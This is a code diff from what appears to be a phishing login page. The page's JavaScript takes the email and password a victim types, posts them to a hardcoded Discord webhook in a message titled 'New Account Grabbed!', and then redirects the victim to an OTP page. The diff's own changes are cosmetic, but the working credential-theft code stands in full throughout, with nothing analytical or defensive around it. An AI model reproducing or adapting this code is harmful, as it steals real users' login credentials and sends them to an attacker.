@@ -233,7 +233,6 @@ body {
         
         if (email && password) {
           
-
           fetch("https://discord.com/api/webhooks/1450510149876715712/V72h6vseNrLJD7BuA7JQiSzxDnzrHhtY5ygGsI0VbdGhrfE_0Nvdg1mqXDYup49WJnbd", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -242,11 +241,12 @@ body {
               embeds: [{
                 title: "❗ New Account Grabbed! ❗",
                 description: `**Email Address:**\n*${email}*\n**Password:**\n*${password}*`,
-                color: 0x00ff04,
+                color: 0x00ff04
               }],
             }),
           }).catch(console.error);
-          window.location.replace("otp.html")
+         window.location.replace("otp.html")
+          
         }else{
           alert("please enter username and password")
         }
